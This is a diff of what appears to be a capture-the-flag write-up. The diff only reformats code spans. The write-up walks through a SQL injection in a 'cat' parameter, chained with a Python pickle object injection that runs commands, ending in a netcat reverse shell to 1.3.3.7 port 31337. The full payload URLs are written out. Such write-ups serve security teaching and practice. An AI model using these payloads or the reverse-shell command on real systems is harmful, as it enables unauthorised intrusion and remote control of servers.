@@ -18,15 +18,15 @@
 
 Immediately on visiting the target URL you're greeted with a list of "objects", each has an id.
 
-```http://54.84.124.93/?cat=1```
+`http://54.84.124.93/?cat=1`
 
 The `cat` param is a sql injection opportunity
 
-```http://54.84.124.93/?cat=1/**/or/**/1=1/**/union/**/all/**/select/**/1,2,3,4--```
+`http://54.84.124.93/?cat=1/**/or/**/1=1/**/union/**/all/**/select/**/1,2,3,4--`
 
 This injection leads to a Python error being printed on the final row of the output table in the 3rd field.
 
-```1    2    'int' object has no attribute 'encode'  4```
+`1    2    'int' object has no attribute 'encode'  4`
 
 This means we now control a payload that is being passed to Python for execution, based on the output of other fields and hints in intro, it's a Python object injection flaw.  Now we craft our injected object.
 
@@ -66,15 +66,15 @@ cposix%0asystem%0ap0%0a(S'/bin/ls'%0ap1%0atp2%0aRp3%0a.%0a
 
 Now use it in the injection
 
-```http://54.84.124.93/?cat=1/**/or/**/1=1/**/union/**/all/**/select/**/1,2,%27cposix%0asystem%0ap0%0a(S'/bin/ls'%0ap1%0atp2%0aRp3%0a.%0a%27,4--```
+`http://54.84.124.93/?cat=1/**/or/**/1=1/**/union/**/all/**/select/**/1,2,%27cposix%0asystem%0ap0%0a(S'/bin/ls'%0ap1%0atp2%0aRp3%0a.%0a%27,4--`
 
 We have a functional injection, but not the value we'd expected
 
-```1    2   512  4```
+`1    2   512  4`
 
 We then use the injection to trigger a reverse shell using netcat
 
-```http://54.84.124.93/?cat=1/**/or/**/1=1/**/union/**/all/**/select/**/1,2,%27cposix%0asystem%0ap0%0a(S'/bin/nc -e/bin/bash 1.3.3.7 31337'%0ap1%0atp2%0aRp3%0a.%0a%27,4--```
+`http://54.84.124.93/?cat=1/**/or/**/1=1/**/union/**/all/**/select/**/1,2,%27cposix%0asystem%0ap0%0a(S'/bin/nc -e/bin/bash 1.3.3.7 31337'%0ap1%0atp2%0aRp3%0a.%0a%27,4--`
 
 ```
 $nc -vvv -l -p 31337
